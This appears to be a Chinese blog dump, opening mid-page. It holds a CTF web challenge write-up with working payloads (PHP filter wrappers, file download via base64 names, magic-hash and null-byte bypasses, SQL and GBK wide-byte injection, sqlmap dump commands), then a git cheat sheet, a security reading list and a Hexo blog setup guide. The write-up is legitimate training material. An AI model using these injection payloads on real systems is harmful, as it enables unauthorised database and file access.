src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-a.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-l.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-4.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-g.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#125;.7.2.min.js\"&gt;&lt;/script&gt;--&gt; 手打flag：1flag:nctf&#123;this_is_a_fl4g&#125; AAencodeURL: http://chinalover.sinaapp.com/web20/aaencode.txt 查了下AAencode，找到一个在线解密网址：http://utf-8.jp/public/aaencode.html 贴进去跑跑就可以了。 文件包含URL: http://4.chinalover.sinaapp.com/web7/index.php 分享篇关于文件包含的文章：https://dollberg.xyz/ctf/2016/12/29/33C3-CTF-list0r/ 然后是php官方手册：http://php.net/manual/zh/wrappers.php.php 通过伪协议读个源码：1file=php://filter/read=convert.base64-encode/resource=index.php 得到base64加密后的字符串：1PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= 解密后：12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt;&lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125;$file=$_GET['file'];if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit();&#125;include($file);//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; Download~!URL: http://way.nuptzj.cn/web6/ Tips说不要下载mp3文件，先看下源码：1234567891011121314&lt;div id=\"templatemo_content\"&gt; &lt;div class=\"content_title_01\"&gt;听会歌吧&lt;/div&gt; &lt;div class=\"horizontal_divider_01\"&gt;&amp;nbsp;&lt;/div&gt; &lt;div class=\"cleaner\"&gt;&amp;nbsp;&lt;/div&gt; &lt;p&gt;为了让大家更轻松的比赛，为大家准备了两首歌让大家下载&lt;/p&gt; &lt;p&gt;&lt;a href=\"download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=\" target=\"_blank\"&gt;星星点灯&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=\"download.php?url=YnV4aWFuZ3poYW5nZGEubXAz\" target=\"_blank\"&gt;不想长大&lt;/a&gt;&lt;/p&gt; &lt;div class=\"cleaner\"&gt;&amp;nbsp;&lt;/div&gt; &lt;/div&gt; 发现下载链接格式均为：1download.php?url=base64 其中base64为文件名。还有一个提示是”down”，查询”down.php”的base64编码后构造：1http://way.nuptzj.cn/web6/download.php?url=ZG93bi5waHA= 没有得到什么东西。再尝试”download.php”：1http://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw 拿到一份php源码：1234567891011121314151617181920??&lt;?phperror_reporting(0);include(\"hereiskey.php\");$url=base64_decode($_GET[url]);if( $url==\"hereiskey.php\" || $url==\"buxiangzhangda.mp3\" || $url==\"xingxingdiandeng.mp3\" || $url==\"download.php\")&#123; $file_size = filesize($url); header ( \"Pragma: public\" ); header ( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" ); header ( \"Cache-Control: private\", false ); header ( \"Content-Transfer-Encoding: binary\" ); header ( \"Content-Type:audio/mpeg MP3\"); header ( \"Content-Length: \" . $file_size); header ( \"Content-Disposition: attachment; filename=\".$url); echo(file_get_contents($url)); exit;&#125;else &#123; echo \"Access Forbidden!\";&#125;?&gt; 发现还有一个文件hereiskey.php，构造新的payload:1http://way.nuptzj.cn/web6/download.php?url=aGVyZWlza2V5LnBocA== 下载之：123?&lt;?php//flag:nctf&#123;download_any_file_666&#125;?&gt; md5 collisionURL: http://chinalover.sinaapp.com/web19/ 参考文档： https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo 给出了源码：123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125;?&gt; php的弱类型问题。a不能等于QNKCDZO但是a的md5值要等于QNKCDZO加密后的md5值。文档里给出的解释是： md5(‘240610708’) ‘s result is 0e462097431906509019562988736854. md5(‘QNKCDZO’) ‘s result is 0e830400451993494058024219903391. They are both float number format strings (numerical strings), and if you use == in php, when compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. Both of the strings are converted to 0 when compared with ==, if you want to compare them as string, remember to use ===(strict comparison) instead. payload：1http://chinalover.sinaapp.com/web19/?a=240610708 MYSQLURL: http://chinalover.sinaapp.com/web11/ 按提示看了波robots.txt，构造：1http://chinalover.sinaapp.com/web11/robots.txt 得到TIP与源码：12345678910111213141516TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 可以得出flag在sql.php下，需要传入id值，注意到intval函数，这里做了个int型的强转换。payload： http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 /x00URL: http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php view-source:12345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 这里学了一个00截断。首先要满足传入的值是数字，然后又要传入#biubiubiu，用字符截断构造payload：1http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu 得到flag：1Flag: flag:nctf&#123;use_00_to_jieduan&#125; bypass againURL: http://chinalover.sinaapp.com/web17/index.php 源码：1234567if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) === md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 之前有做过类似的，payload如下:1http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=2 变量覆盖URL: http://chinalover.sinaapp.com/web18/index.php 先看一波source:123456789&lt;?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=\"alert alert-success\"&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; 题目很明显了的变量覆盖，上hackbar发个post就可以了：1pass=1&amp;thepassword_123=1 这里有个extract函数，可以看看这个：http://www.w3school.com.cn/php/func_array_extract.asp SQL注入1URL: http://chinalover.sinaapp.com/index.php 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125;&#125;echo $query[user];?&gt; 抓住这句：1$sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; 尝试user=admin’)提前闭合的方法，只能看到一条warning1Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in index.php on line 14 于是构造新的payload把后面的语句注释掉1admin') --abc 提交拿到flag1Logged in! flag:nctf&#123;ni_ye_hui_sql?&#125; sql injection 3URL: http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 先试了下id=1’，得到的回显是：12your sql:select id,title from news where id = '1\\''Hello World!OVO 单引号被转义了。再访问id=2，得到语句：12your sql:select id,title from news where id = '2'gbk_sql_injection 可以确定是个宽字节注入的问题。我们可以利用%df’来逃脱单引号束缚，以进行下一步的注入。 %df%5c在GBK编码中是属于一个字符”運”，我我们输入id=1%df%27的时候，程序检测到有单引号（%27），就默认在它前面加了一个转义符（%5c），数据库查询语句就变成了select * from news where id = ‘1%df%5c%27’，又因为%df%5c在GBK编码中是一个中文字符，这样我们的%27（也就是单引号）就逃出转义了。 构造id=%df’，果然看到报错了：12your sql:select id,title from news where id = 'ß\\''Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10 下面开始注入，试了两种方法，分手动注入与使用sqlmap两种方式来讲讲。 手动注入的方式注意这里的union必须前后字段数相同。//查看当前数据库有几列：?id=1%df’ order by 3 –+ your sql:select id,title from news where id = ‘1ß\\’ order by 3 – ‘Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10 //？id=1%df%27 union select 1, table_name from information_schema.tables%23 your sql:select id,title from news where id = ‘ß\\’ union select 1, table_name from information_schema.tables#’CHARACTER_SETS 假的，后来再看好像改了题目，之后再补充吧。 使用sqlmap的方式前面我们已经确定了注入点，于是试了试用sqlmap来爆出flag，也算是熟悉一下这个工具。 sqlmap支持五种不同的注入模式： 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 联合查询注入，可以使用union的情况下的注入。 堆查询注入，可以同时执行多条语句的执行时的注入。 先列举下数据库表：1sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" --tables 发现可以爆表，得到了如下五个表名(另外information_schema这张表里保存了MySQL服务器所有数据库信息，比如数据库名，数据库的表，表格里的数据类型与访问权限等。)： 列举表中字段：1sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" --columns -T ctf 没找到什么有用的东西。直接跑出所有表中的内容：1sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" --dump-all 在ctf4这张表里找到了flag。(在ctf2的表里还有个假flag…)","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"writeup","slug":"writeup","permalink":"https://icyris.github.io/tags/writeup/"}]},{"title":"GIT时光机","date":"2017-05-12T16:17:27.000Z","path":"2017/05/13/git/","text":"Ak师傅的小灶上谈了些关于git的常见用法，回去以后做了些整理。 参考链接： Aklis写的wiki阮一峰的git教程廖雪峰的git教程 一、时光机硬件说明书 Workspace： 工作区 Index / Stage： 暂存区 Repository： 本地仓库 Remote： 远程仓库 HEAD： 当前分支 Commit history： 历史记录 0X01 零件组装这里有三种情况：1234567891. 在当前目录新建一个Git代码库(如果是要使用github上的库，需要先pull下来，不然无法push到目标库，这里的第三种方法就可以。)$ git init2. 新建目录，将其初始化为Git仓库$ git init project-name3. pull下来一个项目与其代码历史$ git clone URL 0X02 时光机的配置Git有个设置文件.gitconfig，它可以全局配置，也可以项目配置。1234567891.显示当前的Git配置$ git config --list2.编辑Git配置文件$ git config -e [--global]3.设置提交代码时的用户信息$ git config [--global] user.name \"name\"$ git config [--global] user.email \"email address\" 0X03 在时光机上注入add钙奶12345678910111213141516171819201.添加指定文件到暂存区$ git add file1 file2 ... 2.添加指定目录到暂存区（包括其中的子目录）$ git add dir（文件夹名称）3.添加当前目录所有文件到暂存区$ git add .4.分次提交$ git add -p5.删除工作区文件，并且把这次删除放入暂存区$ git rm file1 file2 ...6.停止追踪指定文件（该文件会保留在工作区）$ git rm --cached file7.改名文件，然后把这个改名文件放入暂存区$ git mv file-original file-renamed 0X04 挪挪挪，挪进仓库12345678910111213141516171.提交暂存区到仓库区$ git commit -m \"message\"2.提交暂存区指定文件到仓库区$ git commit file1 file2 ... -m \"message\"3.提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a4.提交时显示所有diff信息$ git commit -v5.使用一次新的commit，替代上一次提交。如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m \"message\"6.重做上一次commit，并包括指定文件的新变化$ git commit --amend file1 file2 ... 0X05 时光机分机1234567891011121314151617181920212223242526272829303132333435363738394041421.列出所有本地分支$ git branch2.列出所有远程分支$ git branch -r3.列出所有本地分支和远程分支$ git branch -a4.新建一个分支，但依然停留在当前分支$ git branch [branch-name]5.新建一个分支，并切换到该分支$ git checkout -b [branch]6.新建一个分支，指向指定commit$ git branch [branch] [commit]7.新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]8.切换到指定分支，并更新工作区$ git checkout [branch-name]9.切换到上一个分支$ git checkout -10.建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]11.合并指定分支到当前分支$ git merge [branch]12.选择一个commit，合并进当前分支$ git cherry-pick [commit]13.删除分支$ git branch -d [branch-name]14.删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 0X06 Tag12345678910111213141516171819202122232425261.列出所有tag$ git tag2.新建一个tag在当前commit$ git tag [tag]3.新建一个tag在指定commit$ git tag [tag] [commit]4.删除本地tag$ git tag -d [tag]5.删除远程tag$ git push origin :refs/tags/[tagName]6.查看tag信息$ git show [tag]7.提交指定tag$ git push [remote] [tag]8.提交所有tag$ git push [remote] --tags9.新建一个分支，指向某个tag$ git checkout -b [branch] [tag] 0X07 信息查看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859601.显示有变更的文件$ git status2.显示当前分支的版本历史$ git log3.显示commit历史，以及每次commit发生变更的文件$ git log --stat4.搜索提交历史，根据关键词$ git log -S [keyword]5.显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s6.显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件$ git log [tag] HEAD --grep feature7.显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]8.显示指定文件相关的每一次diff$ git log -p [file]9.显示过去5次提交$ git log -5 --pretty --oneline10.显示所有提交过的用户，按提交次数排序$ git shortlog -sn11.显示指定文件是什么人在什么时间修改过$ git blame [file]12.显示暂存区和工作区的差异$ git diff13.显示暂存区和上一个commit的差异$ git diff --cached [file]14.显示工作区与当前分支最新commit之间的差异$ git diff HEAD15.显示两次提交之间的差异$ git diff [first-branch]...[second-branch]16.显示今天你写了多少行代码$ git diff --shortstat \"@&#123;0 day ago&#125;\"17.显示某次提交的元数据和内容变化$ git show [commit]18.显示某次提交发生变化的文件$ git show --name-only [commit]19.显示某次提交时，某个文件的内容$ git show [commit]:[filename]20.显示当前分支的最近几次提交$ git reflog 0X08 远程同步篇12345678910111213141516171819202122231.下载远程仓库的所有变动$ git fetch [remote]2.显示所有远程仓库$ git remote -v3.显示某个远程仓库的信息$ git remote show [remote]4.增加一个新的远程仓库，并命名$ git remote add [shortname] [url]5.取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]6.上传本地指定分支到远程仓库$ git push [remote] [branch]7.强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force8.推送所有分支到远程仓库$ git push [remote] --all 0X09 时光回溯篇1234567891011121314151617181920212223242526272829301.恢复暂存区的指定文件到工作区$ git checkout [file]2.恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]3.恢复暂存区的所有文件到工作区$ git checkout .4.重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]5.重置暂存区与工作区，与上一次commit保持一致$ git reset --hard6.重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]7.重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]8.重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]9.新建一个commit，用来撤销指定commit，后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]10.暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop 二、Github与信仰 这个周目是关于Linux下git时光机的实际应用 —— 把已有项目推到Github上。 Github账号的创建与git的安装配置不再作说明。 1X01 设置Git设置用户名与email：12git config --global user.name \"your name\"git config --global user.email \"youremail@lalala.com\" 此时在/home下会新建一个.gitconfig文件 1X02 配置SSH1.创建SSH Key1$ ssh-keygen -t rsa -C \"youremail@lalala.com\" 系统会提示key的保存位置，一般为~/.ssh，接下来会请求输入口令，一路默认，敲三次回车即可。 然后登陆gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; 取个容易区分的名字 -&gt; 把~/.ssh/id_rsa.pub文件中的内容粘贴上去即可。 用下面的命令进行测试：1ssh -T git@github.com 1X03 push and pull from github1.在新建的~/My_Message_Board目录中git clone已存在GitHub上的Repository1git clone URL 2.先修改个readme，提交。1234567sudo vi README.mdgit statusgit add README.mdgit statusgit commit -m \"Cyris readme-change 5/17\"git statusgit remote add origin URL 报了个错：1fatal: remote origin already exists. 解决方法：1$ git remote rm origin 再来。1$ git remote add origin URL（这些URL都是github里复制的URL） 3.下面把它push上去1$ git push -u origin master 这里会要求输入GitHub账户的用户名和密码。输入即可。 4.提交完成，去GitHub看眼Repository。内容修改成功。","tags":[{"name":"git","slug":"git","permalink":"https://icyris.github.io/tags/git/"},{"name":"wiki","slug":"wiki","permalink":"https://icyris.github.io/tags/wiki/"}]},{"title":"魔法禁书目录","date":"2017-04-15T01:38:00.000Z","path":"2017/04/15/wiki/","text":"vidar team整理的一份推荐书单，各个方向各个阶段均有。 推荐图书目录渗透方向：· 基础类&#160; &#160; &#160; &#160;《PHP基础教程.第4版》&#160; &#160; &#160; &#160;《PHP与MySQL权威指南》&#160; &#160; &#160; &#160;《Javascript权威指南》&#160; &#160; &#160; &#160;《Python基础教程》&#160; &#160; &#160; &#160;《Python 网络编程》&#160; &#160; &#160; &#160;《TCP/IP协议详解 三卷》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《HTTP权威指南》&#160; &#160; &#160; &#160;《图解HTTP》&#160; &#160; &#160; &#160;《HTTP协议详解》&#160; &#160; &#160; &#160;《Python绝技：运用Python成为顶级黑客》 · 攻防类&#160; &#160; &#160; &#160;《白帽子讲WEB安全》&#160; &#160; &#160; &#160;《Web前端 黑客技术揭秘》&#160; &#160; &#160; &#160;《Kali Linux Web 渗透测试》&#160; &#160; &#160; &#160;《黑客攻防技术宝典Web实战篇》&#160; &#160; &#160; &#160;《SQL注入攻击与防御》&#160; &#160; &#160; &#160;《XSS跨站脚本攻击剖析与防御》&#160; &#160; &#160; &#160;《安全参考系列》&#160; &#160; &#160; &#160;《Python黑帽子：黑客与渗透测试编程之道》 逆向方向：· 基础类（建议按顺序学习）&#160; &#160; &#160; &#160;《汇编语言》&#160; &#160; &#160; &#160;《汇编语言编程艺术》&#160; &#160; &#160; &#160;《Windows环境下32位汇编语言程序设计-琢石成器 第3版》&#160; &#160; &#160; &#160;《WINDOWSPE权威指南》&#160; &#160; &#160; &#160;《C++反汇编与逆向分析技术揭秘》&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《逆向工程实战》&#160; &#160; &#160; &#160;《逆向工程核心原理 》&#160; &#160; &#160; &#160;《逆向工程揭密/安全技术大系中文版》&#160; &#160; &#160; &#160;《Malware analyst’s cookbook》&#160; &#160; &#160; &#160;《Python灰帽子：黑客与逆向工程师的Python编程之道》 · 进阶类&#160; &#160; &#160; &#160;《加密与解密》&#160; &#160; &#160; &#160;《Windows PE权威指南》&#160; &#160; &#160; &#160;《恶意代码分析实战》&#160; &#160; &#160; &#160;《0day安全软件漏洞分析技术》&#160; &#160; &#160; &#160;《数据结构》（严蔚敏著） Android 方向：· 开发&#160; &#160; &#160; &#160;《疯狂JAVA讲义》&#160; &#160; &#160; &#160;《疯狂Android讲义》&#160; &#160; &#160; &#160;《第一行代码-Android》&#160; &#160; &#160; &#160;《Android移动开发一本就够了》&#160; &#160; &#160; &#160;《Android基础教程》&#160; &#160; &#160; &#160;《Android C++ 高级编程-使用NDK》&#160; &#160; &#160; &#160;《Android驱动开发权威指南》&#160; &#160; &#160; &#160;《Android软件安全与逆向分析》&#160; &#160; &#160; &#160;《深入理解Android II卷》&#160; &#160; &#160; &#160;《Android安全攻防实战》 Windows&amp;Linux 方向：&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《Windows核心编程》&#160; &#160; &#160; &#160;《寒江独钓Windows内核安全编程》&#160; &#160; &#160; &#160;《鸟哥的linux私房菜基础篇+服务器篇》&#160; &#160; &#160; &#160;《Linux内核精髓》&#160; &#160; &#160; &#160;《深入理解LINUX内核》 网络方向：&#160; &#160; &#160; &#160;《思科网络技术学院教程CCNA Exploration: 网络基础知识》&#160; &#160; &#160; &#160;《思科 网络技术学院教程CCNA Exploration:路由协议和概念》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《计算机网络》（Andrew S.Tanenbaum著）&#160; &#160; &#160; &#160;《Wireshark数据包分析实战》&#160; &#160; &#160; &#160;《网络分析技术揭秘》 无线电安全方向：&#160; &#160; &#160; &#160;《无线网络安全攻防实战进阶》&#160; &#160; &#160; &#160;《无线电安全攻防大揭秘》&#160; &#160; &#160; &#160;《射频识别(RFID)核心技术详解》&#160; &#160; &#160; &#160;《黑客大曝光：无线网络安全》&#160; &#160; &#160; &#160;《BackTrack 5 Wireless Penetration Testing Beginner’s Guide》 &#160; &#160; &#160; &#160;文章：（因为图书比较少，遂从某大佬处Get一些比较好的案例分析）&#160; &#160; &#160; &#160;《RFID Hacking ④ : ProxMark3 破解门禁》&#160; &#160; &#160; &#160;《RFID Hacking ③ : ProxMark3 使用案例：嗅探银行闪付卡信息》&#160; &#160; &#160; &#160;《HackRF嗅探蓝牙重放iBeacons信号》&#160; &#160; &#160; &#160;《永不消逝的电波（三）：低功耗蓝牙（BLE）入门之如何调戏别人的小米手环》&#160; &#160; &#160; &#160;《Mousejack Hacking : 利用MouseJack进行物理攻击浅析》&#160; &#160; &#160; &#160;《MouseJack Hacking 测试指南》&#160; &#160; &#160; &#160;《BLE Hacking：使用Ubertoothone扫描嗅探低功耗蓝牙》&#160; &#160; &#160; &#160;《RFID Hacking – 资源大合集》 新技术（容器、云、机器学习相关）：· Docker&#160; &#160; &#160; &#160;《第一本Docker书》&#160; &#160; &#160; &#160;《Docker入门实战》&#160; &#160; &#160; &#160;《Docker容器与容器云》&#160; &#160; &#160; &#160;《Docker开发实践》 · 机器学习&#160; &#160; &#160; &#160;《机器学习》&#160; &#160; &#160; &#160;《深入浅出数据分析》&#160; &#160; &#160; &#160;《啤酒与尿布》&#160; &#160; &#160; &#160;《集体智慧编程》&#160; &#160; &#160; &#160;《统计学习方法》 · 云计算&#160; &#160; &#160; &#160;《云计算：概念、技术与架构》&#160; &#160; &#160; &#160;《深入理解云计算：基本原理和应用程序编程技术》&#160; &#160; &#160; &#160;《云数据中心构建实战：核心技术、运维管理、安全与高可用》&#160; &#160; &#160; &#160;《云计算核心技术剖析》&#160; &#160; &#160; &#160;《实战Hadoop》 另外附上协会wiki","tags":[{"name":"wiki","slug":"wiki","permalink":"https://icyris.github.io/tags/wiki/"}]},{"title":"Windows下利用Hexo+Coding搭建静态博客","date":"2017-04-05T08:13:35.000Z","path":"2017/04/05/hexo-blog/","text":"一篇关于hexo博客搭建的小教程。 按照粉学姐和土土的教程搭了两三天，终于做成了这个静态博客。本文将介绍如何用Hexo+Coding搭建Blog，另外附上粉学姐和土土的教程，部分语句直接引用原文。 粉学姐的教程土土的教程 Hexo的安装安装gitgit选择适合自己系统的git下载安装，我选择的windows。 安装node.jsnode.js这里我选择的是V6.10.2 LFS，可以根据自己的系统选择合适的版本安装。 安装HEXO打开安装好的Git Bash，键入： npm install -g hexo 然后把Hexo更新到最新版本，键入： npm update hexo -g 部署Hexo这里创建一个名为hexo的文件夹，用来放置博客文件，然后在hexo文件夹内右键Git Bash，键入： $ hexo init 然后，hexo会自动在这个文件夹里生成你建立网站的所有文件。到这里我们已经搭建起本地的博客了，执行以下命令，同样在hexo文件夹下右键Git Bash输入以下命令：12$ hexo g$ hexo s 然后在浏览器输入 http://localhost:4000 可以看到当前博客效果。（最初的模板不是很耐看，我们会在后面说明更换主题。）我们需要把博客部署在网络上，这样别人才看得到。Hexo博客只支持ie8以上的浏览器。 配置CodingCoding是国内的网站，不用担心被墙的问题。 注册CodingCoding官网 添加项目登陆之后，新建一个空项目，名字和自己的ID一致。 配置SSH密钥1.在桌面右键Bit Bash，然后键入： $ cd ~/. ssh 如果提示：No such file or directory 说明你是第一次使用Git，请直接跳到第三步。 2.如果不是第一次使用，执行下面的操作，然后跳到第四步：123$ mkdir key_backup$ cp id_rsa* key_backup $ rm id_rsa* 3.生成密钥，键入:（把邮箱改成自己邮箱地址） ssh-keygen -t rsa -C “YOUR_EMAIL@YOUREMAIL.COM” 生成过程中会让你输入passphrase口令，可以直接回车，以后出现都是空密码。12345678$ ssh-keygen -t rsa -C \"YOUR_EMAIL@YOUREMAIL.COM\"Generating public/private rsa key pair.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /c/Users/USERNAME/.ssh/id_rsa.Your public key has been saved in /c/Users/USERNAME/.ssh/id_rsa.pub.The key fingerprint is:15:81:d2:7a:c6:6c:0f:ec:b0:b6:d4:18:b8:d1:41:48 YOUR_EMAIL@YOUREMAIL.COM 4.生成密钥后，在目录找到私钥 id_rsa 和公钥 id_rsa.pub 这两个文件。千万不要把私钥文件 id_rsa 透露给任何人。否则别人可以以管理员身份登录你的blog。 5.在coding中添加ssh使用文本工具打开id_rsa.pub,复制里面的所有内容。进入coding-&gt;项目-&gt;进入项目-&gt;左侧设置-&gt;部署公钥-&gt;新建部署公钥，公钥名称随意，在SSH-RSA公钥内容文本框中，把刚才复制的东西全部粘贴进去，然后添加。 6.在桌面右键Git Bash，测试是否可以连接到服务器。 ssh -T git@git.coding.net 如果是第一次链接，会出现以下警告：123The authenticity of host 'git.coding.com (50.116.2.223)' can't be established.#RSA key fingerprint is 84:9e:c9:8e:7f:36:28:08:7e:13:bf:43:12:74:11:4e.#Are you sure you want to continue connecting (yes/no)? 直接输入yes，然后会提示输入passphrase，如果刚才是空密码，那么直接回车过去就好。 如果出现下面的字符，就说明成功了： Hi USERNAME! You’ve successfully authenticated, but GitCafe does not provide shell access. 设置GIT账户信息在桌面右键Git Bash，键入：12$ git config --global user.name \"yourname\" //coding上的用户名$ git config --global user.email \"yourmaill@yourmaili.com\" //填写自己的邮箱 添加Pages目录如果直接上传，上传上去的只是所谓的博客源码，如果我们要让我们博客显示出来，就要建立pages目录。 打开hexo文件夹，右键Git Bash，然后键入：1234567echo 'Hello, world' &gt; index.htmlgit initgit add .git commit -a -m 'Hello, world!'git remote add origin git@git.coding.net:Cyris/Cyris.git //把这里的Cyris替换成自己的idgit checkout -b coding-pagesgit push origin coding-pages 完成上面的操作，在coding的项目界面便会出现coding-pages的分支，然后进入分支界面，把默认分支改为coding-pages，删除原默认分支。 配置Hexo的配置文件_config.yml配置好Hexo和coding之后，我们需要把两者联系在一起。用编辑器打开_config.yml文件（推荐sublime），打开之后把最后的deploy改为：1234deploy:type: gitrepository: git@git.coding.net:Cyris/Cyris.gitbranch: coding-pages 这里使用的是nodo.js语法，这种语法对格式的要求相当高，：后必须跟上空格，不然会报错，请严格按照格式来写。 开启Coding-Pages服务登录Coding，点进项目 -&gt; 代码 -&gt; Pages服务 -&gt; 开启服务 绑定自定义域名在Coding服务页，可以输入自己的域名，然后点击添加域名绑定。然后在你的域名管理页面添加一个CNAME记录，将他指向coding-pages：cyris.coding.me，然后保存。 完成配置在Hexo目录右键Git Bash，键入：12hexo ghexo d 每次修改自己的任何配置文件，或者新建了博文，都必须输入这两个指令上传！ 如果出现报错： ERROR Deployer not found: git 解决方法： npm install hexo-deployer-git –save 